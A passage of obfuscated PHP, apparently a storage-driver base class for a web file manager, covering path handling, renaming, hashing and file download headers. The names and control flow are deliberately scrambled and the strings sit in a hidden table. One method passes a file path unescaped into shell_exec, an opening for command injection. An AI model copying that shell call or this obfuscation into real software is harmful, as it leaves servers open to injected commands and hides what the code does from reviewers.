@mb_convert_encoding($cœ„ºò¯Ì, $eîè¼ò„¾ë, $e¨©Åãµ³‰); } else { $bçÙæÛ –É = @iconv($e¨©Åãµ³‰, $eîè¼ò„¾ë, $cœ„ºò¯Ì); } goto eŠ†ù’‚¸‹; D„„‡……ßà: return $bçÙæÛ –É; goto Fö±éÓ›§; eŠ†ù’‚¸‹: $bçÙæÛ –É = $bçÙæÛ –É ? $bçÙæÛ –É : $cœ„ºò¯Ì; if (strstr($bçÙæÛ –É, $EÃºØ×óõ‰[69])) { $bçÙæÛ –É = str_replace($EÃºØ×óõ‰[69], $EÃºØ×óõ‰[70], $bçÙæÛ –É); } $BİÕŸ¨µ[$e¨©Åãµ³‰ . $EÃºØ×óõ‰[66] . $eîè¼ò„¾ë . $EÃºØ×óõ‰[67] . $cœ„ºò¯Ì] = $bçÙæÛ –É; goto dÚÕ¨ŒÜ•Ì; a¥´‚ñÜ¢Í: $EÃºØ×óõ‰ =& $_SERVER[”Ì÷ñ­î¸]; if (!$cœ„ºò¯Ì || !function_exists($EÃºØ×óõ‰[65])) { return $cœ„ºò¯Ì; } static $BİÕŸ¨µ = array(); goto b»Ìî«À³æ; dÚÕ¨ŒÜ•Ì: $BİÕŸ¨µ[$eîè¼ò„¾ë . $EÃºØ×óõ‰[66] . $e¨©Åãµ³‰ . $EÃºØ×óõ‰[67] . $cœ„ºò¯Ì] = $cœ„ºò¯Ì; $BİÕŸ¨µ[$eîè¼ò„¾ë . $EÃºØ×óõ‰[66] . $e¨©Åãµ³‰ . $EÃºØ×óõ‰[67] . $bçÙæÛ –É] = $cœ„ºò¯Ì; $BİÕŸ¨µ[$e¨©Åãµ³‰ . $EÃºØ×óõ‰[66] . $eîè¼ò„¾ë . $EÃºØ×óõ‰[67] . $bçÙæÛ –É] = $bçÙæÛ –É; goto D„„‡……ßà; Fö±éÓ›§: } public function getPathInner($D‚ìã‘Ş) { $eçÔÑ„”ö® = IO::init($D‚ìã‘Ş); return $eçÔÑ„”ö®->path; } public function getPathOuter($c½ŒĞ¾‚“ˆ) { $C³èâÏÔ¾ =& $_SERVER[”Ì÷ñ­î¸]; $B©ÛŠàäĞ = strlen(trim($this->pathBase, $C³èâÏÔ¾[8])); $c½ŒĞ¾‚“ˆ = substr(trim($c½ŒĞ¾‚“ˆ, $C³èâÏÔ¾[8]), $B©ÛŠàäĞ); return $this->pathDriver . $C³èâÏÔ¾[8] . ltrim($c½ŒĞ¾‚“ˆ, $C³èâÏÔ¾[8]); } public function isParentOf($aÓñæÛ¨•õ, $C´‰àªÄßæ) { $dÓ‰ö¾Á =& $_SERVER[”Ì÷ñ­î¸]; $aÓñæÛ¨•õ = rtrim(strtolower($aÓñæÛ¨•õ), $dÓ‰ö¾Á[8]) . $dÓ‰ö¾Á[8]; $C´‰àªÄßæ = rtrim(strtolower($C´‰àªÄßæ), $dÓ‰ö¾Á[8]) . $dÓ‰ö¾Á[8]; $B¸–›õºŸ„ = strpos($C´‰àªÄßæ, $aÓñæÛ¨•õ) === 0; return $B¸–›õºŸ„; } public function getType() { $DÚÜø”‘İÊ =& $_SERVER[”Ì÷ñ­î¸]; $c²ëŠè‚Û’ = str_replace($DÚÜø”‘İÊ[71], $DÚÜø”‘İÊ[33], get_class($this)); return strtolower($c²ëŠè‚Û’); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($BîÁà‚×, $BËè·ÆŸĞ‘) { $cÎêÏ‰êáÒ =& $_SERVER[”Ì÷ñ­î¸]; $dÀ„§çÆÑˆ = rtrim($BîÁà‚×, $cÎêÏ‰êáÒ[8]) . $cÎêÏ‰êáÒ[8] . $BËè·ÆŸĞ‘; $EÁ¬„Ì‰ùÖ = $this->exist($dÀ„§çÆÑˆ); return $EÁ¬„Ì‰ùÖ ? $dÀ„§çÆÑˆ : !1; } public function renameObject($B¿Î‹ÆÆî¸, $D¼—¯ñ‰Í) { goto C´Â¹ÊÌƒ; d³ÍòÊ¿Ó: return $Ašù¾–…®È ? $D¼—¯ñ‰Í : !1; goto d÷é‚ĞÊ»É; C´Â¹ÊÌƒ: $CÀ¾«Ä˜Â— =& $_SERVER[”Ì÷ñ­î¸]; $AÀøë¿Š‘Ó = $D¼—¯ñ‰Í; Hook::trigger($CÀ¾«Ä˜Â—[72], $this, $B¿Î‹ÆÆî¸, $this, $this->pathFather($B¿Î‹ÆÆî¸) . $D¼—¯ñ‰Í); goto bÌ«‰âŞ×ô; bÌ«‰âŞ×ô: $B¿Î‹ÆÆî¸ = $this->getPathOuter($B¿Î‹ÆÆî¸); $D¼—¯ñ‰Í = $this->pathFather($B¿Î‹ÆÆî¸) . $D¼—¯ñ‰Í; if (IO::isFile($B¿Î‹ÆÆî¸)) { $Ašù¾–…®È = IO::copy($B¿Î‹ÆÆî¸, $this->pathFather($B¿Î‹ÆÆî¸), REPEAT_RENAME_FOLDER, $AÀøë¿Š‘Ó); if ($Ašù¾–…®È) { IO::remove($B¿Î‹ÆÆî¸); } } else { $Ašù¾–…®È = IO::mkdir($D¼—¯ñ‰Í); if (!$Ašù¾–…®È) { return !1; } $aº¢í¾°´ = IO::listPath($B¿Î‹ÆÆî¸, !0); $Dâ…¶à–ĞÎ = array_merge($aº¢í¾°´[$CÀ¾«Ä˜Â—[73]], $aº¢í¾°´[$CÀ¾«Ä˜Â—[74]]); foreach ($Dâ…¶à–ĞÎ as $f¼ñàå²¢§) { IO::move($f¼ñàå²¢§[$CÀ¾«Ä˜Â—[75]], $D¼—¯ñ‰Í, REPEAT_RENAME_FOLDER); } IO::remove($B¿Î‹ÆÆî¸); } goto d³ÍòÊ¿Ó; d÷é‚ĞÊ»É: } public function tempFile($A‰—µ½É¤ = '', $aåàŒì‡å = '') { goto c™ï™›î¼; EÍî°ÛïÈ‹: return $fÓİ®ˆ‹ˆâ; goto DÕ•“ùêæÌ; c„Ü¡ô£¿: $fÓİ®ˆ‹ˆâ = $aÌ¸³ì¡•Ú . $A‰—µ½É¤; @touch($fÓİ®ˆ‹ˆâ); if ($aåàŒì‡å) { file_put_contents($fÓİ®ˆ‹ˆâ, $aåàŒì‡å); } goto EÍî°ÛïÈ‹; c™ï™›î¼: if (!$A‰—µ½É¤) { $A‰—µ½É¤ = rand_string(15); } $aÌ¸³ì¡•Ú = TEMP_FILES . rand_string(15) . $_SERVER[”Ì÷ñ­î¸][8]; @mkdir($aÌ¸³ì¡•Ú, 511, !0); goto c„Ü¡ô£¿; DÕ•“ùêæÌ: } public function tempFileRemve($A²Ç·ƒŞô¾) { @unlink($A²Ç·ƒŞô¾); @rmdir($this->pathFather($A²Ç·ƒŞô¾)); } public function mkfile($fñ–¤ê¾ñ‘, $a¤íè‚‘ƒÛ = '', $d•¹ğ£ßÃ™ = REPEAT_RENAME) { } public function mkdir($e¿ÉÇÊ¶³„, $bùàĞÛË©Š = REPEAT_SKIP) { } public function delFile($Dæß­í»ÅŒ) { } public function delFolder($CÜ¡ö±Àã) { } public function copyFile($e«ó•Ÿ´ã®, $cÏ‰’ö±Ø) { } public function moveFile($E–´Æ·¾Ù, $e°ò¬•ÌÆâ) { } public function remove($BŠØ™Æ¦µ‚) { if ($this->isFile($BŠØ™Æ¦µ‚)) { return $this->delFile($BŠØ™Æ¦µ‚); } return $this->delFolder($BŠØ™Æ¦µ‚); } public function rename($D±ä÷£œñÛ, $D´‡îÑ•Ô) { } public function exist($A…õ‰Èà¥) { } public function findByHash($bÓç™íç²ˆ = '', $D¨²Â§Æ¢ = '') { return !1; } public function isFile($A×ĞÛŠâ©¨) { } public function isFolder($A‚­Š¡Œ¢) { } public function size($eë’Æ¬¹õ) { } public function info($F‹ĞİÏœ) { } public function infoSimple($Eù’‡Üµó¬) { return $this->info($Eù’‡Üµó¬); } public function infoAuth($F”æÒºÒŠ) { return $this->info($F”æÒºÒŠ); } public function infoFull($e¤–³Ô”) { return $this->info($e¤–³Ô”); } public function infoWithChildren($dŠ´²š•ÄÛ) { $E¶‰†àÃ«š =& $_SERVER[”Ì÷ñ­î¸]; static $cèÌ—¹•ÜÖ = array(); if (isset($cèÌ—¹•ÜÖ[$dŠ´²š•ÄÛ])) { return $cèÌ—¹•ÜÖ[$dŠ´²š•ÄÛ]; } $EÉããƒÑ×¼ = $this->info($dŠ´²š•ÄÛ); if ($EÉããƒÑ×¼ && $EÉããƒÑ×¼[$E¶‰†àÃ«š[29]] == $E¶‰†àÃ«š[76]) { $e‚Å¥×î›Ù = array($E¶‰†àÃ«š[77] => 0, $E¶‰†àÃ«š[78] => 0, $E¶‰†àÃ«š[79] => 0); $this->infoChildren($dŠ´²š•ÄÛ, $e‚Å¥×î›Ù); $EÉããƒÑ×¼[$E¶‰†àÃ«š[77]] = $e‚Å¥×î›Ù[$E¶‰†àÃ«š[77]]; $EÉããƒÑ×¼[$E¶‰†àÃ«š[80]] = array($E¶‰†àÃ«š[81] => $e‚Å¥×î›Ù[$E¶‰†àÃ«š[78]], $E¶‰†àÃ«š[82] => $e‚Å¥×î›Ù[$E¶‰†àÃ«š[79]]); $cèÌ—¹•ÜÖ[$dŠ´²š•ÄÛ] = $EÉããƒÑ×¼; } return $EÉããƒÑ×¼; } public function listPath($Aö‡ŠÍ×ô¥, $fªùÏÌÊåË = false) { } public function has($EìĞ¥“Øğ, $b†£ö¢«­” = false, $F«¸àÃ™¼ˆ = false) { } public function canRead($dçÄÕÒœÎ«) { } public function canWrite($D‹«•¨†˜œ) { } public function getContent($BƒæÔ‡ˆ‹ô) { } public function setContent($Eùç‘§Û, $D´ÔÕÆäö = '') { } protected function infoChildren($B¬—¤ñÍœ, &$FµäÀòƒˆØ) { $B×ÊË²Ö… =& $_SERVER[”Ì÷ñ­î¸]; check_abort(); $Aì´±ÙÌåŸ = $this->listPath($B¬—¤ñÍœ, !0); $Aì´±ÙÌåŸ = array_merge($Aì´±ÙÌåŸ[$B×ÊË²Ö…[74]], $Aì´±ÙÌåŸ[$B×ÊË²Ö…[73]]); foreach ($Aì´±ÙÌåŸ as $fÊğÓÊé¹) { if ($fÊğÓÊé¹[$B×ÊË²Ö…[29]] == $B×ÊË²Ö…[76]) { $FµäÀòƒˆØ[$B×ÊË²Ö…[79]]++; $E™³£ŸÀîµ = $this->getPathInner($fÊğÓÊé¹[$B×ÊË²Ö…[75]]); $this->infoChildren($E™³£ŸÀîµ, $FµäÀòƒˆØ); } else { $FµäÀòƒˆØ[$B×ÊË²Ö…[78]]++; $FµäÀòƒˆØ[$B×ÊË²Ö…[77]] += $fÊğÓÊé¹[$B×ÊË²Ö…[77]]; } } } public function fileSubstr($A“Ã ÒŞç, $A­¬ºãî»õ, $BÉîÄòÉ™Ì) { } public function listAll($BƒÙùõÓ†‘) { } public function upload($b±ì‚ì¸, $bÌ¡¨ŠîŞí, $aÛ¿Î§­êï = false, $CéÇ©éÕà = REPEAT_REPLACE) { } public function uploadFileByID($a…’òö’íº, $C«ƒë¢ÎĞ, $e¦ß¨ãÑÃ‰) { } public function uploadFileByPath($eÏŸó•ˆ‡™, $c›“¡ˆª‚¥, $Fá¡Õˆ½†µ = array()) { } public function isUploadServer() { $a™Æ·“±Š =& $_SERVER[”Ì÷ñ­î¸]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $a™Æ·“±Š[83]) { return !0; } return $GLOBALS[$a™Æ·“±Š[6]][$a™Æ·“±Š[84]][$a™Æ·“±Š[85]]; } public function isFileOutServer() { $D«˜ÊŸÎ‹ =& $_SERVER[”Ì÷ñ­î¸]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $D«˜ÊŸÎ‹[83]) { return !0; } return $GLOBALS[$D«˜ÊŸÎ‹[6]][$D«˜ÊŸÎ‹[84]][$D«˜ÊŸÎ‹[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($añ©–íÓê†) { $AœÑîÇøò =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->isCdnHost()) { return $añ©–íÓê†; } return str_replace(trim(get_url_root($añ©–íÓê†), $AœÑîÇøò[8]), trim($this->cdnHost, $AœÑîÇøò[8]), $añ©–íÓê†); } public function uploadLink($EØÒŒµ’ÕÈ, $AÉÓ ‹Ëíã = 0) { goto E«ŠÙÏ›¦ë; E«ŠÙÏ›¦ë: $AÈŠ¾‰Â®˜ =& $_SERVER[”Ì÷ñ­î¸]; if ($this->isUploadServer()) { return; } $cÈâµÇ¨…Œ = $this->getType(); goto bä×Í…¡»Ó; A¹Ï§´Äƒæ: $Eˆ”Á‘ÆÓÁ = $AÉÓ ‹Ëíã <= $DÌä¬ºœŠŒ ? $AÈŠ¾‰Â®˜[87] : $AÈŠ¾‰Â®˜[88]; $dÁ‘ìÌ×È¬ = (!$AÉÓ ‹Ëíã ? 1 : ceil($AÉÓ ‹Ëíã / pow(1024, 3))) * 3600 * 4; $ešÒÎÛÕƒº = $this->{$Eˆ”Á‘ÆÓÁ}($EØÒŒµ’ÕÈ, $dÁ‘ìÌ×È¬); goto e±íçŠ˜Ë”; e±íçŠ˜Ë”: if ($ešÒÎÛÕƒº) { $ešÒÎÛÕƒº[$AÈŠ¾‰Â®˜[89]] = $EØÒŒµ’ÕÈ; $ešÒÎÛÕƒº[$AÈŠ¾‰Â®˜[90]] = $cÈâµÇ¨…Œ; } return $ešÒÎÛÕƒº; goto C¢ó†ÇŒ™; bä×Í…¡»Ó: if (!in_array($cÈâµÇ¨…Œ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DÌä¬ºœŠŒ = 1024 * 1024 * 10; goto A¹Ï§´Äƒæ; C¢ó†ÇŒ™: } public function uploadFormData($däåğÏ÷®¶, $B˜“Á¨¸ğ = 3600) { } public function multiUploadFormData($c„¾Š¦¬…¼, $eÀ®Íß¹¿ñ = 3600) { } public function download($aœ“˜Ëƒæ, $D„„©ùÅÎÔ) { } public function ext($FÑÎŠù¥) { $EŸ…¨›¾Ù° =& $_SERVER[”Ì÷ñ­î¸]; if (strpos($FÑÎŠù¥, $EŸ…¨›¾Ù°[8]) === -1) { $dÖõ‹º©Œ = $FÑÎŠù¥; } else { $dÖõ‹º©Œ = $this->pathThis($FÑÎŠù¥); } $c˜²¹¢öŸ = $EŸ…¨›¾Ù°[33]; if (strstr($dÖõ‹º©Œ, $EŸ…¨›¾Ù°[91])) { $c˜²¹¢öŸ = substr($dÖõ‹º©Œ, strrpos($dÖõ‹º©Œ, $EŸ…¨›¾Ù°[91]) + 1); $c˜²¹¢öŸ = strtolower($c˜²¹¢öŸ); } if (strlen($c˜²¹¢öŸ) > 3 && preg_match($EŸ…¨›¾Ù°[92], $c˜²¹¢öŸ, $A‰÷ª‡ ÒŒ)) { $c˜²¹¢öŸ = $EŸ…¨›¾Ù°[33]; } return $c˜²¹¢öŸ; } public function pathThis($C¤Œ—„×®) { $B’£õŸ°Ã =& $_SERVER[”Ì÷ñ­î¸]; $C¤Œ—„×® = str_replace($B’£õŸ°Ã[93], $B’£õŸ°Ã[8], rtrim($C¤Œ—„×®, $B’£õŸ°Ã[8])); $fÓ–ŞÌ ½ = strrpos($C¤Œ—„×®, $B’£õŸ°Ã[8]); if ($fÓ–ŞÌ ½ === !1) { return $C¤Œ—„×®; } return substr($C¤Œ—„×®, $fÓ–ŞÌ ½ + 1); } public function pathFather($Dµ”£¶õÙ) { $Aé¹ã¥Û¡¨ =& $_SERVER[”Ì÷ñ­î¸]; $Dµ”£¶õÙ = str_replace($Aé¹ã¥Û¡¨[93], $Aé¹ã¥Û¡¨[8], rtrim($Dµ”£¶õÙ, $Aé¹ã¥Û¡¨[8])); $fğãÖñò‹ = strrpos($Dµ”£¶õÙ, $Aé¹ã¥Û¡¨[8]); if ($fğãÖñò‹ === !1) { return $Aé¹ã¥Û¡¨[33]; } return substr($Dµ”£¶õÙ, 0, $fğãÖñò‹ + 1); } public function hashSimple($F…ÍÑÍ¶Ç÷) { goto DğŠ™Û²ëÖ; DğŠ™Û²ëÖ: $a‡ŞÁùÍ–Ö =& $_SERVER[”Ì÷ñ­î¸]; if (!$F…ÍÑÍ¶Ç÷) { return md5($a‡ŞÁùÍ–Ö[33]); } $d“èïâõŒ = $this->size($F…ÍÑÍ¶Ç÷); goto Dâ‹ùª¾­İ; Dâ‹ùª¾­İ: $B¡×¯…‡‡À = 200; $AÎ†¤ğĞæê = 50; if ($d“èïâõŒ <= $B¡×¯…‡‡À * $AÎ†¤ğĞæê) { return $this->hashMd5($F…ÍÑÍ¶Ç÷) . $d“èïâõŒ; } goto A±ÊÏóÑ±Š; C££“±«Ÿ’: $d´Âª¬¿ .= $this->fileSubstr($F…ÍÑÍ¶Ç÷, $d“èïâõŒ - $B¡×¯…‡‡À, $B¡×¯…‡‡À); return md5($d´Âª¬¿) . $d“èïâõŒ; goto C©²ùÚíšù; A±ÊÏóÑ±Š: $B¼¹Ö÷ÈÈğ = intval($d“èïâõŒ / $AÎ†¤ğĞæê); $d´Âª¬¿ = $a‡ŞÁùÍ–Ö[33]; for ($Fºß´Å¿§” = 0; $Fºß´Å¿§” < $AÎ†¤ğĞæê; $Fºß´Å¿§”++) { $d´Âª¬¿ .= $this->fileSubstr($F…ÍÑÍ¶Ç÷, $B¼¹Ö÷ÈÈğ * $Fºß´Å¿§”, $B¡×¯…‡‡À); } goto C££“±«Ÿ’; C©²ùÚíšù: } public static $md5Cache = array(); public function hashMd5($A¹Ó¸öŞµÇ) { $A¹Ó¸öŞµÇ = $this->iconvSystem($A¹Ó¸öŞµÇ); if (isset(self::$md5Cache[$A¹Ó¸öŞµÇ])) { return self::$md5Cache[$A¹Ó¸öŞµÇ]; } self::$md5Cache[$A¹Ó¸öŞµÇ] = $this->hashMd5Shell($A¹Ó¸öŞµÇ); if (!self::$md5Cache[$A¹Ó¸öŞµÇ]) { self::$md5Cache[$A¹Ó¸öŞµÇ] = @md5_file($A¹Ó¸öŞµÇ); } return self::$md5Cache[$A¹Ó¸öŞµÇ]; } private function hashMd5Shell($dÒ©¢ŒÜŞ©) { goto cñÚ½ò°Œ˜; E¡ñá…®ïÇ: $C¯Ëê”‘è¯ = shell_exec($eŠ¡šÔ¦¯‰ . "\x20\42{$dÒ©¢ŒÜŞ©}\42"); $C¯Ëê”‘è¯ = str_replace($F±£ÚáÙÒ”[100], $F±£ÚáÙÒ”[33], $C¯Ëê”‘è¯); return substr($C¯Ëê”‘è¯, 0, 32); goto bÊ®øŠŠà; cñÚ½ò°Œ˜: $F±£ÚáÙÒ” =& $_SERVER[”Ì÷ñ­î¸]; if (!function_exists($F±£ÚáÙÒ”[94])) { return !1; } $c¿÷ÕœÂ£ = array($F±£ÚáÙÒ”[95], $F±£ÚáÙÒ”[96]); goto fòÄÎ§ñÁÀ; fòÄÎ§ñÁÀ: $eŠ¡šÔ¦¯‰ = Cache::get($F±£ÚáÙÒ”[97]); if (!$eŠ¡šÔ¦¯‰) { $dÈ¿Ã˜ÄÜ = BASIC_PATH . $F±£ÚáÙÒ”[98]; $A‘§ ÷ÄŸ¦ = md5_file($dÈ¿Ã˜ÄÜ); $eŠ¡šÔ¦¯‰ = $F±£ÚáÙÒ”[99]; foreach ($c¿÷ÕœÂ£ as $DĞ„–äàÈ) { $C¯Ëê”‘è¯ = shell_exec($DĞ„–äàÈ . "\x20\42{$dÈ¿Ã˜ÄÜ}\x22"); if ($C¯Ëê”‘è¯ && substr(trim($C¯Ëê”‘è¯), 0, 32) == $A‘§ ÷ÄŸ¦) { $eŠ¡šÔ¦¯‰ = $DĞ„–äàÈ; break; } } Cache::set($F±£ÚáÙÒ”[97], $eŠ¡šÔ¦¯‰, 3600); } if ($eŠ¡šÔ¦¯‰ == $F±£ÚáÙÒ”[99]) { return !1; } goto E¡ñá…®ïÇ; bÊ®øŠŠà: } public function link($BŸ™Ğì™¾…) { return $BŸ™Ğì™¾…; } public function fileOut($F¶ƒ£Š×œÆ, $Dëé³ …± = false, $bŞÅÄ‡ÅêŒ = false, $fĞ…óÓæğ = '') { goto b’Û‡œ‡Ë; A‘ö®ï¨Œî: $bñ–ÕÙ¨Œ› = $this->getType() == $e‡¿Í‚ß¾ß[102]; $f› •ƒëÈ = $GLOBALS[$e‡¿Í‚ß¾ß[6]][$e‡¿Í‚ß¾ß[84]][$e‡¿Í‚ß¾ß[103]][$e‡¿Í‚ß¾ß[104]]; $bƒß¶™£ŒÑ = (double) $GLOBALS[$e‡¿Í‚ß¾ß[6]][$e‡¿Í‚ß¾ß[84]][$e‡¿Í‚ß¾ß[103]][$e‡¿Í‚ß¾ß[105]] * 1024 * 1024; goto Aàœç²¥­À; bÕŒáŠ´‘: if (in_array($B˜”¢¹¦Íè, array($e‡¿Í‚ß¾ß[108], $e‡¿Í‚ß¾ß[109], $e‡¿Í‚ß¾ß[110], $e‡¿Í‚ß¾ß[111]))) { $B˜”¢¹¦Íè = $e‡¿Í‚ß¾ß[112]; } if (!$fĞ…óÓæğ) { $fĞ…óÓæğ = md5($Dè³”…õ³ . $this->hashSimple($F¶ƒ£Š×œÆ)); } $fĞ…óÓæğ = $e‡¿Í‚ß¾ß[113] . $fĞ…óÓæğ . $e‡¿Í‚ß¾ß[113]; goto F‘èÂ„ãÁä; dŞ‹øÙ‹Ìõ: header($e‡¿Í‚ß¾ß[135] . $Fé‘ŒÀ¹ƒ); header($e‡¿Í‚ß¾ß[136]); if (!$Dëé³ …± && $B˜”¢¹¦Íè == $e‡¿Í‚ß¾ß[137]) { if ($Fé‘ŒÀ¹ƒ > 1024 * 1024 * 5) { die; } $A´µôß¾å´ = $this->getContent($F¶ƒ£Š×œÆ); $A´µôß¾å´ = Html::clearSVG($A´µôß¾å´); header($e‡¿Í‚ß¾ß[138] . $Fé‘ŒÀ¹ƒ); echo $A´µôß¾å´; die; } goto AÚñ¨°´Ã‰; EŞ¹‰§ô”³: if ($bƒß¶™£ŒÑ) { $EÒ¿‰‘ÄÌÁ = intval(1000 * 1000 * ($fé«‹×õ™“ / $bƒß¶™£ŒÑ)); } while ($B½ñÍ˜öºñ <= $Fœ£Æ«—ğ) { $a‹¬¢®À§¿ = timeFloat(); check_abort(); $CÃÅäğâ¤ = $Fœ£Æ«—ğ - $B½ñÍ˜öºñ + 1; if ($CÃÅäğâ¤ <= $fé«‹×õ™“) { $fé«‹×õ™“ = $CÃÅäğâ¤; } echo $this->fileSubstr($F¶ƒ£Š×œÆ, $B½ñÍ˜öºñ, $fé«‹×õ™“); $B½ñÍ˜öºñ += $fé«‹×õ™“; if ($fé«‹×õ™“ == $CÃÅäğâ¤) { $B½ñÍ˜öºñ = $Fœ£Æ«—ğ + 1; } if ($EÒ¿‰‘ÄÌÁ) { $CŒ¢ìÔèøº = intval(1000 * 1000 * (timeFloat() - $a‹¬¢®À§¿)); $Cã÷–õñç = $EÒ¿‰‘ÄÌÁ - $CŒ¢ìÔèøº; if ($Cã÷–õñç > 5) { usleep($Cã÷–õñç); } } } goto B¸ß…ÓĞÒ¬; d“”ªµíç: if ($_SERVER[$e‡¿Í‚ß¾ß[154]] == $e‡¿Í‚ß¾ß[155]) { return; } $fé«‹×õ™“ = 1024 * 100; $EÒ¿‰‘ÄÌÁ = 0; goto EŞ¹‰§ô”³; Aó¥šªˆ¢: if (isset($_SERVER[$e‡¿Í‚ß¾ß[128]]) && strtotime($_SERVER[$e‡¿Í‚ß¾ß[128]]) == $FÁŸÊ”ÁÊ[$e‡¿Í‚ß¾ß[107]]) { header($e‡¿Í‚ß¾ß[129], !0, 304); die; } if (isset($_SERVER[$e‡¿Í‚ß¾ß[130]]) && $_SERVER[$e‡¿Í‚ß¾ß[130]] == $fĞ…óÓæğ) { header($e‡¿Í‚ß¾ß[131] . $fĞ…óÓæğ, !0, 304); die; } header($e‡¿Í‚ß¾ß[131] . $fĞ…óÓæğ); goto ağ«ŞÕáí; b’Û‡œ‡Ë: $e‡¿Í‚ß¾ß =& $_SERVER[”Ì÷ñ­î¸]; $this->cacheMethod(null, null); if (!$F¶ƒ£Š×œÆ || !$this->exist($F¶ƒ£Š×œÆ)) { show_json(LNG($e‡¿Í‚ß¾ß[101]), !1, $bŞÅÄ‡ÅêŒ); } goto A‘ö®ï¨Œî; a‚±·ÑÀ„‡: header($e‡¿Í‚ß¾ß[125]); header($e‡¿Í‚ß¾ß[126]); header($e‡¿Í‚ß¾ß[127]); goto Aó¥šªˆ¢; B£†ô›Ëàñ: $Eçøä«—¯ = rawurlencode($CˆòÏâòê); $Eçøä«—¯ = $e‡¿Í‚ß¾ß[113] . $Eçøä«—¯ . $e‡¿Í‚ß¾ß[117] . $Eçøä«—¯; if ($Dëé³ …±) { header($e‡¿Í‚ß¾ß[118]); header($e‡¿Í‚ß¾ß[119] . $Eçøä«—¯); } else { header($e‡¿Í‚ß¾ß[120] . $Eçøä«—¯); } goto BŒË«ÈîÇ; AÚñ¨°´Ã‰: $B•µ á = strtolower($_SERVER[$e‡¿Í‚ß¾ß[139]]); if ($bñ–ÕÙ¨Œ› && $B•µ á && $f› •ƒëÈ) { if (strstr($B•µ á, $e‡¿Í‚ß¾ß[140])) { header($e‡¿Í‚ß¾ß[141] . $F¶ƒ£Š×œÆ); } else { if (strstr($B•µ á, $e‡¿Í‚ß¾ß[142])) { header($e‡¿Í‚ß¾ß[143] . $F¶ƒ£Š×œÆ); } else { if (strstr($B•µ á, $e‡¿Í‚ß¾ß[144])) { header($e‡¿Í‚ß¾ß[145] . $F¶ƒ£Š×œÆ); } } } if ($bƒß¶™£ŒÑ) { header($e‡¿Í‚ß¾ß[146] . $bƒß¶™£ŒÑ); } return; } if (isset($_SERVER[$e‡¿Í‚ß¾ß[147]])) { if (preg_match($e‡¿Í‚ß¾ß[148], $_SERVER[$e‡¿Í‚ß¾ß[147]], $CÚé²ÆŞ„)) { $B½ñÍ˜öºñ = intval($CÚé²ÆŞ„[1]); if (!empty($CÚé²ÆŞ„[2])) { $Fœ£Æ«—ğ = intval($CÚé²ÆŞ„[2]); } } header($e‡¿Í‚ß¾ß[149]); header("\103\157\x6e\164\145\156\164\x2d\x52\141\x6e\147\x65\72\40\x62\x79\x74\x65\163\40{$B½ñÍ˜öºñ}\x2d{$Fœ£Æ«—ğ}\x2f" . $Fé‘ŒÀ¹ƒ); } else { header($e‡¿Í‚ß¾ß[150]); } goto b¿®¼³‘Èî; Eç¦‚¦ò’: $Fé‘ŒÀ¹ƒ = $FÁŸÊ”ÁÊ[$e‡¿Í‚ß¾ß[77]]; $Dè³”…õ³ = gmdate($e‡¿Í‚ß¾ß[106], $FÁŸÊ”ÁÊ[$e‡¿Í‚ß¾ß[107]]); $CˆòÏâòê = $bŞÅÄ‡ÅêŒ ? $bŞÅÄ‡ÅêŒ : $this->iconvApp($FÁŸÊ”ÁÊ[$e‡¿Í‚ß¾ß[28]]); goto A£½šóô®; Aàœç²¥­À: @ob_end_clean(); set_timeout(); $FÁŸÊ”ÁÊ = $this->infoFull($F¶ƒ£Š×œÆ); goto Eç¦‚¦ò’; b¿®¼³‘Èî: $D„³ÊÂ“‘è = !0; if ($_SERVER[$e‡¿Í‚ß¾ß[151]] == $e‡¿Í‚ß¾ß[152] && $Fé‘ŒÀ¹ƒ > 1204 * 1024 * 1024 * 2) { $D„³ÊÂ“‘è = !1; } if ($D„³ÊÂ“‘è) { header($e‡¿Í‚ß¾ß[153] . ($Fœ£Æ«—ğ - $B½ñÍ˜öºñ + 1)); } goto d“”ªµíç; F‘èÂ„ãÁä: $Dõò†»Á§Á = get_file_mime($B˜”¢¹¦Íè); if (strstr($Dõò†»Á§Á, $e‡¿Í‚ß¾ß[114])) { $Dõò†»Á§Á = $Dõò†»Á§Á . $e‡¿Í‚ß¾ß[115]; } if ($Dëé³ …± === !1 && !mime_support($Dõò†»Á§Á)) { $Dëé³ …± = !0; $Dõò†»Á§Á = $e‡¿Í‚ß¾ß[116]; } goto B£†ô›Ëàñ; A£½šóô®: $B½ñÍ˜öºñ = 0; $Fœ£Æ«—ğ = $Fé‘ŒÀ¹ƒ - 1; $B˜”¢¹¦Íè = $this->ext($CˆòÏâòê); goto bÕŒáŠ´‘; ağ«ŞÕáí: header($e‡¿Í‚ß¾ß[132] . $Dè³”…õ³ . $e‡¿Í‚ß¾ß[124]); header($e‡¿Í‚ß¾ß[133] . $CˆòÏâòê); header($e‡¿Í‚ß¾ß[134]); goto dŞ‹øÙ‹Ìõ; BŒË«ÈîÇ: header($e‡¿Í‚ß¾ß[121]); header($e‡¿Í‚ß¾ß[122] . $Dõò†»Á§Á); header($e‡¿Í‚ß¾ß[123] . gmdate($e‡¿Í‚ß¾ß[106], time() + 3600 * 24 * 30) . $e‡¿Í‚ß¾ß[124]); goto a‚±·ÑÀ„‡; B¸ß…ÓĞÒ¬: } public function fileOutServer($A×ñ»²ãÛ, $eÄùÚñĞÀ¤ = false, $fÖ¬øÀ”š = false, $Cï–ª¨Íß— = '') { $this->fileOut($A×ñ»²ãÛ, $eÄùÚñĞÀ¤, $fÖ¬øÀ”š, $Cï–ª¨Íß—); } public function fileOutLink($Bœà½éŠÍ·) { header($_SERVER[”Ì÷ñ­î¸][156] . $Bœà½éŠÍ·); die; } public function cacheMethod($F¾ôŞ‹‡İ, $b—ÍÓò¯ĞÔ) { goto aÆŒ®Õ¶Û; aÆŒ®Õ¶Û: $D‡·Ï¾´ =& $_SERVER[”Ì÷ñ­î¸]; static $B¹–œŒ¨ñ = array(); $B•ĞÌ°ëÎ‚ = $D‡·Ï¾´[157] . $F¾ôŞ‹‡İ . $D‡·Ï¾´[158] . rtrim($b—ÍÓò¯ĞÔ, $D‡·Ï¾´[8]); goto C¤–È¢œ´¡; C¤–È¢œ´¡: if (is_null($F¾ôŞ‹‡İ)) { 